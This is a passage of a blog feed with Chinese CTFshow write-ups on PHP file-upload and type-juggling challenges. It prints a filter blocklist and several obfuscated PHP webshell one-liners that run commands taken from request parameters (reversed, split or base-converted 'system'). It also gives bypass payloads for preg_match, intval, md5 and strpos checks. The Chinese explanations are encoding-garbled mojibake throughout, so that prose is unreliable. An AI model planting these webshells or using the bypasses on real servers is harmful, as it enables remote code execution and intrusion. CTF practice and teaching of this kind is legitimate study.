number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"Êñá‰ª∂Á±ªÂûã‰∏çÂêàËßÑ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Êú¨Êù•ËøòÊÉ≥ÁùÄÂåÖÂê´‰∏ÄÊ≥¢Êó•Âøó„ÄÇ</p><p><strong>Â≠óÁ¨¶ÊãºÊé•</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token operator">.</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls ../'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><strong>$_REQUEST</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>Êï∞Â≠¶ÂáΩÊï∞</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>acos<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># get‰º†ÂèÇ   abs=system&amp;acos=ls</span></span></code></pre><p><a href="https://yanmie-art.github.io/2020/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6web%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">ËøôÈáå</a></p><p><strong>ÂÖ∂‰ªñÂáΩÊï∞ÊûÑÈÄ†</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1s'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'ystem'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'metsys'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h4><p>Êó•ÂøóÂåÖÂê´</p><p>‰∏çËøáindex.phpÈúÄË¶ÅËá™Â∑±‰∏ä‰º†</p><h4 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h4><p>Âêå169</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Êñá‰ª∂‰∏ä‰º† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-php</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-php/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-php/</url>
      
        <content type="html"><![CDATA[<h4 id="web89-Êï∞ÁªÑÁªïËøá"><a href="#web89-Êï∞ÁªÑÁªïËøá" class="headerlink" title="web89(Êï∞ÁªÑÁªïËøá)"></a>web89(Êï∞ÁªÑÁªïËøá)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÂàÜÊûê‰∏äÈù¢ÁöÑ‰ª£Á†ÅÂèØ‰ª•ÁúãÂá∫ÔºåÊ≠£ÂàôÂåπÈÖç0-9ÔºåÂåπÈÖçÂà∞ÂàôËøîÂõûtrueÔºåÁõ¥Êé•dieÔºå‰ΩÜÊòØÁî±‰∫épreg_match()Âè™ËÉΩÂ§ÑÁêÜÂ≠óÁ¨¶‰∏≤ÔºåÂΩì‰º†ÂÖ•ÁöÑÊòØÊï∞ÁªÑÊó∂Â∞Ü‰ºöËøîÂõûfalse,‰ªéËÄåÁªïËøáÊ≠ª‰∫°ÂáΩÊï∞„ÄÇ</p><p>**intval()<strong>ÂáΩÊï∞Áî®‰∫éËé∑ÂèñÂèòÈáèÁöÑÊï¥Êï∞ÂÄº„ÄÇ</strong>intval()**ÂáΩÊï∞ÈÄöËøá‰ΩøÁî®ÊåáÂÆöÁöÑËøõÂà∂ base ËΩ¨Êç¢ÔºàÈªòËÆ§ÊòØÂçÅËøõÂà∂ÔºâÔºåËøîÂõûÂèòÈáèvarÁöÑ integer Êï∞ÂÄº„ÄÇ intval() ‰∏çËÉΩÁî®‰∫é objectÔºåÂê¶Âàô‰ºö‰∫ßÁîü E_NOTICE ÈîôËØØÂπ∂ËøîÂõû 1„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÂΩìÁªôintval()ÂáΩÊï∞‰º†ÂÖ•‰∏Ä‰∏™ÈùûÁ©∫ÁöÑÊï∞ÁªÑÊó∂Ôºåintval()ÂáΩÊï∞Â∞Ü‰ºöËøîÂõû1ÔºåÁªìÂêàÊàë‰ª¨preg_match()‰º†ÂÖ•Êï∞ÁªÑËøîÂõûfalseÁöÑÁâπÊÄßÔºåËøôÈÅìÈ¢òÁöÑpayloadÂ∞±ÂæàÊ∏ÖÊ•ö‰∫Ü„ÄÇ</p><p>Payload:<code>?num[]=1</code></p><h4 id="web90-intval"><a href="#web90-intval" class="headerlink" title="web90(intval)"></a>web90(intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>intval($var,$base)ÔºåÂÖ∂‰∏≠varÂøÖÂ°´ÔºåbaseÂèØÈÄâÔºåËøôÈáåbase&#x3D;0,ÂàôË°®Á§∫Ê†πÊçÆvarÂºÄÂßãÁöÑÊï∞Â≠óÂÜ≥ÂÆö‰ΩøÁî®ÁöÑËøõÂà∂Ôºö 0xÊàñ0XÂºÄÂ§¥‰ΩøÁî®ÂçÅÂÖ≠ËøõÂà∂Ôºå0ÂºÄÂ§¥‰ΩøÁî®ÂÖ´ËøõÂà∂ÔºåÂê¶Âàô‰ΩøÁî®ÂçÅËøõÂà∂„ÄÇ</p><p>ËøôÈáå&#x3D;&#x3D;&#x3D;Ë°®Á§∫Á±ªÂûãÂíåÊï∞ÂÄºÂøÖÈ°ªÁõ∏Á≠âÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®4476ÁöÑÂÖ´ËøõÂà∂ÊàñÂçÅÂÖ≠ËøõÂà∂ÁªïËøáÊ£ÄÊµã„ÄÇ</p><p>PaylodÔºö</p><blockquote><p>num&#x3D;010574</p><p>num&#x3D;0x117c</p></blockquote><p>intval() ËøòÊúâ‰∏Ä‰∏™ÁâπÊÄß„ÄÇËæìÂÖ•ÁöÑÂÄºÂ¶ÇÊûúÊòØÂ≠óÁ¨¶‰∏≤ÔºåÂÆÉËøîÂõûÁöÑÂÜÖÂÆπÂèñÂÜ≥‰∫éÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶Â∑¶‰æßÁöÑÊï∞Â≠ó„ÄÇÂ¶Ç intval(‚Äò11a22‚Äô)&#x3D;11„ÄÇ</p><blockquote><p>num&#x3D;4476a</p><p>num&#x3D;+4476</p><p>‚Ä¶</p></blockquote><p>Ê†πÊçÆ‰ª•‰∏ãËß£ÈáäÔºåÂèØ‰ª•‰º†ÂÖ•‰∏Ä‰∏™Êï∞ÁªÑÊù•ÁªïËøá‰∏çÂê´Êï∞Â≠óËÄå‰∏îintvalÂèñÊï¥Êï∞</p><p><a href="https://www.nssctf.cn/problem/2076">[NSSCTF 2022 Spring Recruit]babyphp</a></p><pre class="language-none"><code class="language-none">ÈÄöËøá‰ΩøÁî®ÊåáÂÆöÁöÑËøõÂà∂ base ËΩ¨Êç¢ÔºàÈªòËÆ§ÊòØÂçÅËøõÂà∂ÔºâÔºåËøîÂõûÂèòÈáè value ÁöÑ int Êï∞ÂÄº„ÄÇ intval() ‰∏çËÉΩÁî®‰∫é objectÔºåÂê¶Âàô‰ºö‰∫ßÁîü E_WARNING ÈîôËØØÂπ∂ËøîÂõû 1„ÄÇ echo intval(array());                 &#x2F;&#x2F; 0echo intval(array(&#39;foo&#39;, &#39;bar&#39;));     &#x2F;&#x2F; 1</code></pre><h4 id="web91-preg-match-m"><a href="#web91-preg-match-m" class="headerlink" title="web91(preg_match  &#x2F;m)"></a>web91(preg_match  &#x2F;m)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">Apache HTTPD Êç¢Ë°åËß£ÊûêÊºèÊ¥û(CVE-2017-15715)‰∏éÊãìÂ±ï</a></p><p>ËÄÉÂØü‰∫Üpreg_matchÁöÑ&#x2F;mÊ®°Âºè  </p><p>imÊ®°ÂºèÊòØÂèØ‰ª•ÂåπÈÖçÂæàÂ§öË°å  iÊ®°ÂºèÂè™ËÉΩÂåπÈÖç‰∏ÄË°å</p><p>%0aÊç¢Ë°åÔºåÁõ∏ÂΩì‰∫éenter</p><p>PayloadÔºö</p><blockquote><p>cmd&#x3D;%0aphp</p><p>cmd&#x3D;php%0a1</p></blockquote><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><p>Âíå90ÂæàÂÉè‰∏çËøáÁ¨¨‰∏Ä‰∏™ÊØîËæÉÂπ∂‰∏çÊòØÂº∫Á±ªÂûãÔºåÊâÄ‰ª•‰∏çËÉΩ‰ΩøÁî®ÁÆÄÂçïÁöÑ4476aÊàñËÄÖ4476.Êù•ÁªïËøáÔºåÂÖ∂‰ªñÈÉΩÂèØ‰ª•</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><p>ËøáÊª§‰∫ÜÊâÄÊúâÂ≠óÊØç‰ΩÜÊòØÂèØ‰ª•‰ΩøÁî®8ËøõÂà∂</p><p>Payload: <code>num=010574</code></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ËøôÊÆµ‰ª£Á†Å‰∏≠ÁöÑ if(!strpos($num, ‚Äú0‚Äù)){} Ë°å‰ΩøÁî®‰∫Ü PHP ‰∏≠ÁöÑ strpos() ÂáΩÊï∞ÔºåÂÆÉÁöÑ‰ΩúÁî®ÊòØÂú®Â≠óÁ¨¶‰∏≤‰∏≠Êü•ÊâæÁâπÂÆöÂ≠êÂ≠óÁ¨¶‰∏≤Á¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆ„ÄÇÈÄêÊ≠•Ëß£ÈáäËøôÊÆµ‰ª£Á†ÅÁöÑÈÄªËæëÔºö 1.strpos($num, ‚Äú0‚Äù)ÔºöËøôÈÉ®ÂàÜ‰ª£Á†ÅË∞ÉÁî®‰∫Ü strpos() ÂáΩÊï∞ÔºåÁî®‰∫éÂú® $num ÂèòÈáè‰∏≠Êü•ÊâæÂ≠óÁ¨¶ ‚Äú0‚Äù Á¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆ„ÄÇÂ¶ÇÊûúÊâæÂà∞‰∫ÜÔºåÂàôËøîÂõûËØ•‰ΩçÁΩÆÁöÑÁ¥¢ÂºïÂÄºÔºàÁ¥¢ÂºïÂÄº‰ªé0ÂºÄÂßãÔºâÔºåÂ¶ÇÊûúÊ≤°ÊúâÊâæÂà∞ÔºåÂàôËøîÂõû false„ÄÇ</p><p>ÊâÄ‰ª•ÂºÄÂßã‰∏çËÉΩÊúâ0Ôºå‰ΩÜÊòØÂøÖÈ°ªÂæóÊúâ0ÔºåËÄå‰∏îÂàöÂ•ΩÁ¨¨‰∏Ä‰∏™Êç¢Êàê‰∫ÜÂº∫ÊØîËæÉÔºåÊâÄ‰ª•ÂèØ‰ª•‰ΩøÁî®4476.0</p><p>ÁúãÂÖ∂‰ªñwpÊòØÂú®ÂâçÈù¢Âä†‰∏Ä‰∏™Á©∫Ê†ºÔºå‰πüÂ∞±ÊòØ%20‰πüÂèØ‰ª•‰ΩøÁî®%0a</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><p>Á¨¨‰∏Ä‰∏™ÊîπÂõûÂéª‰∫ÜÔºåÊâÄ‰ª•‰∏çËÉΩÁî®4476.0ÂÖ∂‰ªñPayloadÂèØ‰ª•</p><h4 id="web96-ÁªïËøá"><a href="#web96-ÁªïËøá" class="headerlink" title="web96(.&#x2F;ÁªïËøá)"></a>web96(.&#x2F;ÁªïËøá)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Âú®Linux‰∏ã.&#x2F;Ë°®Á§∫ÂΩìÂâçÁõÆÂΩï</p><p>Payload:<code>u=./flag.php</code></p><h4 id="web97-md5Êï∞ÁªÑÁªïËøá"><a href="#web97-md5Êï∞ÁªÑÁªïËøá" class="headerlink" title="web97(md5Êï∞ÁªÑÁªïËøá)"></a>web97(md5Êï∞ÁªÑÁªïËøá)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> </code></pre><p>Ëøô‰∏ÄÈÅìÈ¢òÊ∂âÂèäÂà∞‰∫ÜÂº∫ÊØîËæÉÁöÑmd5Á±ªÂûãÔºå‰ªé‰ª£Á†ÅÊàë‰ª¨ÂèØ‰ª•ÂæóÁü•ÔºåË¶ÅÊ±Ça„ÄÅb‰∏§‰∏™ÂÄº‰∏ç‰∏ÄÊ†∑‰ΩÜÊòØÈúÄË¶ÅËøô‰∏§‰∏™ÂÄºÂæómd5ÂÄº‰∏ÄÊ†∑ÔºåÂõ†Ê≠§Âº∫ÊØîËæÉÁ±ªÂûãÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®md5ÂáΩÊï∞Â§ÑÁêÜÊï∞ÁªÑÁ±ªÂûã‰ºöËøîÂõûfalseÁöÑÁâπÊÄßÔºå‰ªéËÄåÂà©Áî®false&#x3D;falseÊù•ÁªïËøá„ÄÇ</p><p><a href="https://www.freebuf.com/articles/web/321300.html">CTFÁü•ËØÜÁÇπÔºö ÂÖ≥‰∫éPHPËøêÁÆóÁ¨¶&#x3D;&#x3D;&#x3D; ‰∏é&#x3D;&#x3D;ÁöÑÊÄªÁªì</a></p><h4 id="web98-‰∏âÂÖÉËøêÁÆóÁ¨¶Âíå‰º†ÂùÄ-ÂºïÁî®"><a href="#web98-‰∏âÂÖÉËøêÁÆóÁ¨¶Âíå‰º†ÂùÄ-ÂºïÁî®" class="headerlink" title="web98(‰∏âÂÖÉËøêÁÆóÁ¨¶Âíå‰º†ÂùÄ(ÂºïÁî®) )"></a>web98(‰∏âÂÖÉËøêÁÆóÁ¨¶Âíå‰º†ÂùÄ(ÂºïÁî®) )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token 